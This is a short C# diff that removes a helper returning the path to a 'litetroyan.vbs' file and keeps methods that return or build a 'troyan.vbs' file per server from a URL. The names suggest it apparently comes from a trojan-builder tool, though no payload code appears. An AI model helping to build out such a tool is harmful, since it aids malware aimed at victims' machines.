@@ -62,11 +62,6 @@ namespace model
             return Path.Combine(ServerDir(serverName), "troyan.vbs");
         }
         
-        public string GetLiteVbs(string serverName)
-        {
-            return Path.Combine(ServerDir(serverName), "litetroyan.vbs");
-        }
-
         public string BuildVbs(string serverName, string url)
         {
             return Path.Combine(ServerDir(serverName), "troyan.vbs");
